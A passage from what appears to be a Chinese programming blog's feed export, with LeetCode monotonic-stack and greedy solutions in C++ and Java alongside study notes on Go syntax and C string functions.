&amp;&amp; arr[stk.<span class="built_in">top</span>()] &gt; arr[i]) &#123;</span><br><span class="line">                stk.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!stk.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                right[i] = stk.<span class="built_in">top</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            stk.<span class="built_in">push</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (!stk.<span class="built_in">empty</span>())</span><br><span class="line">            stk.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="comment">// 左侧小于arr[i]的最近位置</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">long</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!stk.<span class="built_in">empty</span>() &amp;&amp; arr[stk.<span class="built_in">top</span>()] &gt;= arr[i]) &#123;</span><br><span class="line">                stk.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> l = stk.<span class="built_in">empty</span>() ? <span class="number">-1</span> : stk.<span class="built_in">top</span>();</span><br><span class="line">            <span class="type">int</span> r = right[i];</span><br><span class="line">            ans = (ans + (i - l) * (r - i) * arr[i]) % MOD;</span><br><span class="line">            stk.<span class="built_in">push</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="1856-子数组最小乘积的最大值"><a href="https://leetcode.cn/problems/maximum-subarray-min-product/">1856. 子数组最小乘积的最大值</a></h3>
<blockquote>
<p>先去模再比较最大值会出现问题，11%10=1，9%10=9，但实际是11更大。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> MOD=<span class="number">1e9</span><span class="number">+7</span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxSumMinProduct</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="comment">// right[i]表示i下标右侧小于nums[i]的最近位置</span></span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">right</span><span class="params">(n,n)</span></span>;</span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; stk;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">while</span>(!stk.<span class="built_in">empty</span>()&amp;&amp;nums[stk.<span class="built_in">top</span>()]&gt;=nums[i])</span><br><span class="line">                stk.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span>(!stk.<span class="built_in">empty</span>())</span><br><span class="line">                right[i]=stk.<span class="built_in">top</span>();</span><br><span class="line">            stk.<span class="built_in">push</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!stk.<span class="built_in">empty</span>())</span><br><span class="line">            stk.<span class="built_in">pop</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 计算前缀和</span></span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">sum</span><span class="params">(n<span class="number">+1</span>)</span></span>;</span><br><span class="line">        sum[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            sum[i]=sum[i<span class="number">-1</span>]+nums[i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(!stk.<span class="built_in">empty</span>()&amp;&amp;nums[stk.<span class="built_in">top</span>()]&gt;=nums[i])</span><br><span class="line">                stk.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="type">int</span> l=stk.<span class="built_in">empty</span>()?<span class="number">-1</span>:stk.<span class="built_in">top</span>();</span><br><span class="line">            <span class="type">int</span> r=right[i];</span><br><span class="line">            stk.<span class="built_in">push</span>(i);</span><br><span class="line"></span><br><span class="line">            ans=<span class="built_in">max</span>(ans,nums[i]*(sum[r]-sum[l<span class="number">+1</span>]));</span><br><span class="line">            <span class="comment">// int cur=(nums[i]*(sum[r]-sum[l+1]))%MOD;</span></span><br><span class="line">            <span class="comment">// ans=max(ans,cur);</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans%MOD;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="2104-子数组范围和"><a href="https://leetcode.cn/problems/sum-of-subarray-ranges/">2104. 子数组范围和</a></h3>
<blockquote>
<p>单调栈+贡献法，分别计算每个数作为最大值、最小值的贡献</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">subArrayRanges</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="comment">// 贡献法，枚举每个数字x=nums[i]分别作为最小值，最大值的贡献度</span></span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">minRight</span><span class="params">(n,n)</span>,<span class="title">minLeft</span><span class="params">(n,<span class="number">-1</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">maxRight</span><span class="params">(n,n)</span>,<span class="title">maxLeft</span><span class="params">(n,<span class="number">-1</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; minStk,maxStk;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="comment">// x=nums[i]，找到右侧&lt;=x的第一个位置</span></span><br><span class="line">            <span class="keyword">while</span>(!minStk.<span class="built_in">empty</span>()&amp;&amp;nums[minStk.<span class="built_in">top</span>()]&gt;nums[i])</span><br><span class="line">                minStk.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span>(!minStk.<span class="built_in">empty</span>())</span><br><span class="line">                minRight[i]=minStk.<span class="built_in">top</span>();</span><br><span class="line">            minStk.<span class="built_in">push</span>(i);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// x=nums[i]，找到右侧&gt;=x第一个位置</span></span><br><span class="line">            <span class="keyword">while</span>(!maxStk.<span class="built_in">empty</span>()&amp;&amp;nums[maxStk.<span class="built_in">top</span>()]&lt;nums[i])</span><br><span class="line">                maxStk.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span>(!maxStk.<span class="built_in">empty</span>())</span><br><span class="line">                maxRight[i]=maxStk.<span class="built_in">top</span>();</span><br><span class="line">            maxStk.<span class="built_in">push</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        minStk=<span class="built_in">stack</span>&lt;<span class="type">int</span>&gt;();</span><br><span class="line">        maxStk=<span class="built_in">stack</span>&lt;<span class="type">int</span>&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="comment">// x=nums[i]，找到左侧&lt;x的第一个位置</span></span><br><span class="line">            <span class="keyword">while</span>(!minStk.<span class="built_in">empty</span>()&amp;&amp;nums[minStk.<span class="built_in">top</span>()]&gt;=nums[i])</span><br><span class="line">                minStk.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span>(!minStk.<span class="built_in">empty</span>())</span><br><span class="line">                minLeft[i]=minStk.<span class="built_in">top</span>();</span><br><span class="line">            minStk.<span class="built_in">push</span>(i);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// x=nums[i]，找到左侧&gt;x第一个位置</span></span><br><span class="line">            <span class="keyword">while</span>(!maxStk.<span class="built_in">empty</span>()&amp;&amp;nums[maxStk.<span class="built_in">top</span>()]&lt;=nums[i])</span><br><span class="line">                maxStk.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span>(!maxStk.<span class="built_in">empty</span>())</span><br><span class="line">                maxLeft[i]=maxStk.<span class="built_in">top</span>();</span><br><span class="line">            maxStk.<span class="built_in">push</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> minP=(i-minLeft[i])*(minRight[i]-i)*nums[i];</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> maxP=(i-maxLeft[i])*(maxRight[i]-i)*nums[i];</span><br><span class="line">            ans=ans-minP+maxP;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="2281-巫师的总力量和"><a href="https://leetcode.cn/problems/sum-of-total-strength-of-wizards/">2281. 巫师的总力量和</a></h3>
<blockquote>
<p>求的是子数组的和*最小值，然后所有子数组的情况再进行求和</p>
</blockquote>
<p>$$<br>
\begin{aligned}<br>
&amp;sum是strength的前缀和，ss是sum的前缀和\<br>
&amp;对于[L+1,R-1]范围内，和为sum[R]-sum[L-1]\<br>
&amp;[L+1,R-1]范围内的所有子数组：\ \ \<br>
&amp;\sum_{p=L+1}<sup>{i}\sum_{q=i}</sup>{R-1}(sum[q+1]-sum[p])\<br>
&amp;=(i-L)\sum_{q=i}<sup>{R-1}sum[q+1]-(R-i)\sum_{p=L+1}</sup>{i}sum[p]\<br>
&amp;=(i-L)[sum[i+1]…sum[R]]-(R-i)[sum[L+1]…sum[i]]\<br>
&amp;=(i-L)(ss[R+1]-ss[i+1])-(R-i)(ss[i+1]-ss[L+1])<br>
\end{aligned}<br>
$$</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> MOD = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">totalStrength</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;strength)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = strength.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">right</span><span class="params">(n, n)</span></span>;</span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; stk;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="comment">// 右侧比x=nums[i]小的数的最近下标</span></span><br><span class="line">            <span class="keyword">while</span> (!stk.<span class="built_in">empty</span>() &amp;&amp; strength[stk.<span class="built_in">top</span>()] &gt; strength[i])</span><br><span class="line">                stk.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span> (!stk.<span class="built_in">empty</span>())</span><br><span class="line">                right[i] = stk.<span class="built_in">top</span>();</span><br><span class="line">            stk.<span class="built_in">push</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">sum</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            sum[i] = (sum[i - <span class="number">1</span>] + strength[i - <span class="number">1</span>]) % MOD;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 计算前缀和的前缀和</span></span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">ss</span><span class="params">(n + <span class="number">2</span>)</span></span>;</span><br><span class="line">        ss[<span class="number">0</span>] = sum[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n + <span class="number">1</span>; i++) &#123;</span><br><span class="line">            ss[i] = (ss[i - <span class="number">1</span>] + sum[i - <span class="number">1</span>]) % MOD;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        stk = <span class="built_in">stack</span>&lt;<span class="type">int</span>&gt;();</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!stk.<span class="built_in">empty</span>() &amp;&amp; strength[stk.<span class="built_in">top</span>()] &gt;= strength[i])</span><br><span class="line">                stk.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> l = stk.<span class="built_in">empty</span>() ? <span class="number">-1</span> : stk.<span class="built_in">top</span>();</span><br><span class="line">            <span class="type">int</span> r = right[i];</span><br><span class="line">            stk.<span class="built_in">push</span>(i);</span><br><span class="line">            <span class="comment">// [l+1,r-1]，取模后，两个ss相减可能为负值</span></span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> tmp = (i - l) * (ss[r + <span class="number">1</span>] - ss[i + <span class="number">1</span>]) -</span><br><span class="line">                            (r - i) * (ss[i + <span class="number">1</span>] - ss[l + <span class="number">1</span>]);</span><br><span class="line">            ans = (ans + (tmp % MOD) * strength[i]) % MOD;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (ans+MOD)%MOD;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="891-子序列宽度之和"><a href="https://leetcode.cn/problems/sum-of-subsequence-widths/">891. 子序列宽度之和</a></h3>
<blockquote>
<p>分清每次枚举数字时的单个状态变化，以及需要求的答案总状态</p>
</blockquote>
<p>$$<br>
\begin{aligned}<br>
a,b,c,d,e\<br>
以d作为最大值的贡献：s&amp;=2<sup>2*|d-a|+2</sup>1*|d-b|+2^0*|d-c|\<br>
以e作为最大值的贡献：s’&amp;=2<sup>3*|e-a|+2</sup>2*|e-b|+2<sup>1*|e-c|+2</sup>0*|e-d|\<br>
&amp;=2*(2<sup>2*|d-a|+2</sup>1*|d-b|+2^0*|d-c|)\<br>
&amp;\quad +2<sup>3*|e-d|+2</sup>2*|e-d|+2<sup>1*|e-d|+2</sup>0*|e-d|\<br>
&amp;=2<em>s+(2<sup>3+2</sup>2+2<sup>1+2</sup>0)</em>|e-d|<br>
\end{aligned}<br>
$$</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> MOD=<span class="number">1e9</span><span class="number">+7</span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">sumSubseqWidths</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> total=<span class="number">0</span>,s=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> pre=nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num:nums)&#123;</span><br><span class="line">            s=(<span class="number">2</span>*s+total*(num-pre))%MOD;</span><br><span class="line">            ans=(ans+s)%MOD;</span><br><span class="line">            total=(<span class="number">2</span>*total<span class="number">+1</span>)%MOD;</span><br><span class="line">            pre=num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>方法二：考虑多少个e减去前面数的和</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sumSubseqWidths</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="type">int</span> <span class="variable">MOD</span> <span class="operator">=</span> (<span class="type">int</span>)<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>, total = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// sum计算当前元素num之前元素作为最小元素时的元素和， total计算当前元素num作为最大元素时的个数和</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">long</span> num : nums)&#123;</span><br><span class="line">            res = (res + num % MOD * total  - sum) % MOD;</span><br><span class="line">            sum = (sum * <span class="number">2</span> + num) % MOD;</span><br><span class="line">            total = (total * <span class="number">2</span> + <span class="number">1</span>) % MOD;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>)res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/01/12/%E7%AE%97%E6%B3%95/%E8%B4%AA%E5%BF%83/</url>
    <content><![CDATA[<p><a href="https://leetcode.cn/problems/jump-game-ii/">45. 跳跃游戏 II</a></p>
<blockquote>
<p>0位置可以跳到的区间为[p,q]，在到达q时，从0位置一定跳到[p,q]中某一位置从[p,q]中某一位置可以到达的最远位置为maxPos<br>
从绿色区间、蓝色区间分别进行一次跳跃</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202401121738097.png" alt="image.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">jump</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> step=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> maxPos=<span class="number">0</span>; <span class="comment">//当前可以达到的最远位置</span></span><br><span class="line">        <span class="type">int</span> limit=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>()<span class="number">-1</span>;i++)&#123;</span><br><span class="line">            maxPos=<span class="built_in">max</span>(maxPos,i+nums[i]);</span><br><span class="line">            <span class="keyword">if</span>(i==limit)&#123;</span><br><span class="line">                step++;</span><br><span class="line">                limit=maxPos;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> step;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/01/16/%E8%AF%AD%E6%B3%95/GO/</url>
    <content><![CDATA[<p>interface类型转换</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">value    <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">op,ok:= value.(要转换的类型)</span><br><span class="line">value.(<span class="keyword">type</span>)<span class="comment">//获取类型</span></span><br></pre></td></tr></table></figure>
<h1>defer</h1>
<p>defer 语句会将函数推迟到外层函数返回之后执行。</p>
<p>推迟调用的函数其参数会立即求值，但直到外层函数返回前该函数都不会被调用。</p>
<p>数组类型 <code>[n]T</code> 表示拥有 <code>n</code> 个 <code>T</code> 类型的值的数组。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a [<span class="number">10</span>]<span class="type">int</span></span><br><span class="line"></span><br><span class="line">primes := [<span class="number">6</span>]<span class="type">int</span>&#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s []<span class="type">int</span> = primes[<span class="number">1</span>:<span class="number">4</span>]</span><br></pre></td></tr></table></figure>
<p>range</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//当使用 `for` 循环遍历切片时，每次迭代都会返回两个值。第一个值为当前元素的下标，第二个值为该下标所对应元素的一份副本。</span></span><br><span class="line"><span class="keyword">var</span> pow = []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">32</span>, <span class="number">64</span>, <span class="number">128</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i, v := <span class="keyword">range</span> pow &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;2**%d = %d\n&quot;</span>, i, v)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>映射<br>
<code>make</code> 函数会返回给定类型的映射，并将其初始化备用。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> m <span class="keyword">map</span>[<span class="type">string</span>]Vertex</span><br><span class="line">m = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]Vertex)</span><br><span class="line">elem, ok := m[key]</span><br><span class="line"><span class="built_in">delete</span>(m, key)</span><br><span class="line">elem = m[key]</span><br></pre></td></tr></table></figure>
<h1>哈希表</h1>
<p>Insert or update an element in map <code>m</code>:</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">m[<span class="built_in">key</span>] = <span class="built_in">elem</span></span><br></pre></td></tr></table></figure>
<p>Retrieve an element:</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">elem</span> <span class="operator">=</span> m[key]</span><br></pre></td></tr></table></figure>
<p>Delete an element:</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">delete</span><span class="params">(m, key)</span></span></span><br></pre></td></tr></table></figure>
<p>Test that a key is present with a two-value assignment:</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line"><span class="built_in">elem</span>, ok = m[<span class="built_in">key</span>]</span><br></pre></td></tr></table></figure>
<p>If <code>key</code> is in <code>m</code>, <code>ok</code> is <code>true</code>. If not, <code>ok</code> is <code>false</code>.</p>
<p>If <code>key</code> is not in the map, then <code>elem</code> is the zero value for the map’s element type.</p>
<p><strong>Note:</strong> If <code>elem</code> or <code>ok</code> have not yet been declared you could use a short declaration form:</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line"><span class="built_in">elem</span>, ok := m[<span class="built_in">key</span>]</span><br></pre></td></tr></table></figure>
<p>go panic: assignment to entry in nil map（没有初始化）</p>
<h1>并发</h1>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line">wg.add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span>&#123;</span><br><span class="line">    wg.Done()</span><br><span class="line">&#125;()</span><br><span class="line">wg.Wait()</span><br></pre></td></tr></table></figure>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"><span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++&#123;</span><br><span class="line">    wg.Add(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(x <span class="type">int</span>)</span></span>&#123;</span><br><span class="line">        sendRPC(x)</span><br><span class="line">        wg.Done()</span><br><span class="line">    &#125;(i);</span><br><span class="line">    wg.Wait()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"><span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++&#123;</span><br><span class="line">    wg.Add(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span>&#123;</span><br><span class="line">        sendRPC</span><br><span class="line">        ()</span><br><span class="line">        wg.Done()</span><br><span class="line">    &#125;();</span><br><span class="line">    wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/11/08/%E8%AF%AD%E6%B3%95/Linux%20%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%E3%80%81%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<h2 id="strpbrk">strpbrk</h2>
<blockquote>
<p>检索字符串 <strong>str1</strong> 中第一个匹配字符串 <strong>str2</strong> 中字符的字符，不包含空结束字符。依次检验字符串 str1 中的字符，当被检验字符在字符串 str2 中也包含时，则停止检验，并返回该字符位置。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> *<span class="title">strpbrk</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str1, <span class="type">const</span> <span class="type">char</span> *str2)</span></span></span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2"><strong>str1</strong> – 要被检索的 C 字符串。</li>
<li class="lvl-2"><strong>str2</strong> – 该字符串包含了要在 str1 中进行匹配的字符列表。</li>
</ul>
<h2 id="strcasecmp">strcasecmp</h2>
<blockquote>
<p>判断字符串是否相等的函数，忽略大小写。s1和s2中的所有字母字符在比较之前都转换为小写。该strcasecmp()函数对空终止字符串进行操作。函数的字符串参数应包含一个(’\0’)标记字符串结尾的空字符。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">strcasecmp</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *s1, <span class="type">const</span> <span class="type">char</span> *s2)</span></span>;</span><br></pre></td></tr></table></figure>
<h2 id="strspn">strspn</h2>
<blockquote>
<p>检索字符串 <strong>str1</strong> 中第一个不在字符串 <strong>str2</strong> 中出现的字符下标</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">strspn</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str1, <span class="type">const</span> <span class="type">char</span> *str2)</span></span></span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>str1</strong> – 要被检索的 C 字符串。</p>
</li>
<li class="lvl-2">
<p><strong>str2</strong> – 该字符串包含了要在 str1 中进行匹配的字符列表。</p>
</li>
<li class="lvl-2">
<p>返回 str1 中第一个不在字符串 str2 中出现的字符下标。</p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> *s1 = <span class="string">&quot;abcdef ghj\tio&quot;</span>;</span><br><span class="line">    <span class="type">char</span> *s2 = <span class="string">&quot; \t&quot;</span>;</span><br><span class="line">    <span class="type">char</span> *s3 = <span class="string">&quot;ghj&quot;</span>;</span><br><span class="line">    cout &lt;&lt; *(s1 + <span class="number">7</span>) &lt;&lt; endl;</span><br><span class="line">    <span class="type">char</span> *res = <span class="built_in">strpbrk</span>(s1 + <span class="number">7</span>, s2);</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="built_in">strspn</span>(s1 + <span class="number">7</span>, s3) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">g</span><br><span class="line"><span 